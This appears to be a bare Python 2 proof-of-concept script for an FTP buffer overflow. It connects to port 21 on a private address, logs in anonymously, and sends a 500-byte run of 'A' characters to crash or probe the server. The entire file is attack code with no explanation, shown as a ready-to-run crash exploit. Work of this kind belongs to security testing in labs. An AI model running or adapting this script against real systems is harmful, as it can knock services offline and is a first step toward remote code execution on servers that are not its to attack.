import socket, os, sys

buff = "A"*500

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.2.15', 21))

s.recv(1024)

s.send('USER anonymous\r\n')

s.recv(1024)

s.send('PASS anonymous\r\n')

s.recv(1024)

s.send(buff + '\r\n')

s.send('QUIT\r\n')

s.close()
